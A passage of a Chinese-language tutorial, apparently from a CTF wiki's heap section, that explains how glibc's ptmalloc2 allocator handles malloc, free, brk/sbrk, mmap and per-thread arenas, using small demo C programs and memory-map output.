\u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58 \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f71\u54cd\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86 ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux \u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002 \u5806\u7684\u57fa\u672c\u64cd\u4f5c \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002 malloc \u00b6 \u5728 glibc \u7684 malloc.c \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684**\u6307\u9488** 2 \u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f \u65e0\u7b26\u53f7\u6570 \uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002 free \u00b6 \u5728 glibc \u7684 malloc.c \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002 3 \u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u00b6 \u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002 4 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002 (s)brk \u00b6 \u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542f ASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( curr_brk + 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); brk ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } //gcc sbrk_brk_example.c -m32 -o ./sbrk_brk_example \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86 getchar() \u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528 brk \u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x806c000 \u7b2c\u4e00\u6b21\u589e\u52a0 brk \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x806c000 brk = 0x806d000 \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x806c000\u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p \u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 00:00 \u662f\u4e3b\u4ece (Major/mirror) \u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a 0\u3002 0 \u8868\u793a\u7740 Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 \u7136\u540e\u901a\u8fc7 brk(tmp_brk); \u5c06\u6307\u9488\u5f52\u4f4d\u56de\u5230 0x806c000 \uff0c\u65b0\u51fa\u73b0\u7684 heap \u6d88\u5931\u3002\u5177\u4f53\u548c\u7b2c\u4e00\u6b65\u56fe\u4e00\u6837\uff0c\u4e0d\u8d34\u56fe\u4e86\u3002 mmap \u00b6 malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee5 0 \u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( -1 ); } int main () { int ret = -1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( ret == -1 ) errExit ( \"munmap\" ); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } \u5728\u6267\u884c mmap \u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709. so \u6587\u4ef6\u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86 b7e00000 \u5230 b7e21000 \u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u591a\u7ebf\u7a0b\u652f\u6301 \u00b6 \u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728 glibc \u7684 ptmalloc \u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void* threadFunc(void* arg) { printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar(); } int main() { pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&t1, NULL, threadFunc, NULL); if(ret) { printf(\"Thread creation error\\n\"); return -1; } ret = pthread_join(t1, &s); if(ret) { printf(\"Thread join error\\n\"); return -1; } return 0; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660e malloc \u7684\u80cc\u540e\u662f\u7528 brk \u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e86 1000 \u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e86 0x0806c000-0x0804b000=0x21000 \u4e2a\u5b57\u8282\u7684\u5806\u3002**\u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002**\u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531 glibc \u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b 1 \u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f 